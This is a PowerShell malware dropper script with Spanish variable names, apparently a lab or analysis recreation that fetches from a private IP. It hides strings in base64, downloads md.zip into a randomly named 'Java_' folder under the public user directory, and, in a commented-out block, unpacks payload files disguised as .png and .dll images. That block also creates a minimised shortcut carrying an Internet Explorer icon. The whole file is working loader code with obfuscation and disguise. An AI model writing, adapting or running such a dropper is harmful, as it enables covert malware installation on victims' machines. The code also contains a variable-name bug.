$ejecutable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))   
$comprimido = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))	
$direccion = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aHR0cDovLzE5Mi4xNjguMjAwLjEwL2FuYWxpc2lzL21kLnppcA==')))
$rutaPublic = "AquiDescargaMW"  
$rutaCompletaPublic = "c:\users\public\$rutaPublic\"    
Function funRandom 
{
	$abcdario = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
	$numeros = "2_","3_","4_","5_","6_","7_","8_","9_"
	$nombreRandom = $null  										 					
	$contar6 = Get-Random -InputObject $abcdario -Count 6   					
	$contar1 = Get-Random -InputObject $numeros -Count 1    					
	$abcdarioaContar = Get-Random -InputObject $abcdario.ToUpper() -Count 1    	
	foreach($n in $contar6) 
	{
		$nombreRandom += $n
	}
	
	foreach ($n2 in $contar1) 
	{
		$nombreRandom += $n2
	}

	foreach ($n3 in $abcdarioa_contar) 
	{
		$nombreRandom += $n3
	}

	return "Java_$nombreRandom"
}
$varfunRandom = funRandom  
$rutaAidat = "$rutaCompletaPublic\i.dat"
$validandoRutaAidat = if ($rutaAidat) { Test-Path $rutaAidat }
$validandoRutaAidat
if($validandoRutaAidat -eq 'True')
{
     exit
}
else
{
	New-Item -ItemType directory -Path $rutaCompletaPublic\$varfunRandom
	$WebClient = New-Object System.Net.WebClient
	$WebClient.DownloadFile("http://192.168.200.10/analisis/md.zip","$rutaCompletaPublic\$varfunRandom\$varfunRandom.zip")
	<#$shellApp = new-object -com shell.application 
	$NombreArchivo = $shellApp.namespace("$rutaCompletaPublic\$varfunRandom\$varfunRandom.zip") 
	$destino = $shellApp.namespace("$rutaCompletaPublic\$varfunRandom") 
	$destino.Copyhere($NombreArchivo.items())
	Rename-Item -NewName ("$rutaCompletaPublic\$varfunRandom\$varfunRandom.$ejecutable") -Path ("$rutaCompletaPublic\$varfunRandom\$ejecutable.png")
	Rename-Item -NewName ("$rutaCompletaPublic\$varfunRandom\$varfunRandom.LNS") -Path ("$rutaCompletaPublic\$varfunRandom\12.dll")
	Rename-Item -NewName ("$rutaCompletaPublic\$varfunRandom\sqlite3.dll") -Path ("$rutaCompletaPublic\$varfunRandom\sql.png")

	function func2
	{
  		Param([string]$func2String1,[string]$func2String2);
  	try
	{  
    		$wscriptShell = New-Object -ComObject WScript.Shell 
		    $shortcut = $wscriptShell.CreateShortcut($func2String1) 
    		$shortcut.TargetPath = "$rutaCompletaPublic\$varfunRandom\$varfunRandom.$ejecutable"       
    		$shortcut.Arguments = " $varfunRandom1.LNS  $varfunRandom"
    		$shortcut.WorkingDirectory = "$rutaCompletaPublic\$varfunRandom" 
    		$shortcut.WindowStyle = 7   
    		$shortcut.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    		$shortcut.Save()
  	}
	
	finally{}
	}#>
}
